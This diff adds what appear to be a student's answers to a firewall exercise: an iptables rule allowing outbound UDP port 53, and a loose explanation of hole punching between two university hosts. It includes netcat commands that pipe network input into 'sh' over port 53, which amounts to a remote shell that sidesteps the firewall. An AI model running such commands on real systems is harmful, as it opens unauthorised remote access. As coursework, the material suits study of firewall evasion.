@@ -1,0 +1,20 @@
+a)
+We add a rule on top:
+iptables -I OUTPUT -p udp --dport 53 -j ACCEPT
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+b)
+sandor.cs.ru.nl
+
+ygritte.cs.ru.nl
+
+By sending a request/ping from one of the domains the firewall remmebers who requested information.
+When the information arrives, it directs it to the right host (our previously mentioned website). It allows the incoming traffic.
+We just performed hole punch in the firewall.
+
+
+nc sandor.cs.ru.nl 53 | sh | nc ygritte.cs.ru.nl 53 (on host 1)
+nc ygritte.cs.ru.nl 53 | sh | nc sandor.cs.ru.nl 53 (on host 2)
+nc -l 53 (on host 1)
+nc -l 53 (on host 2)
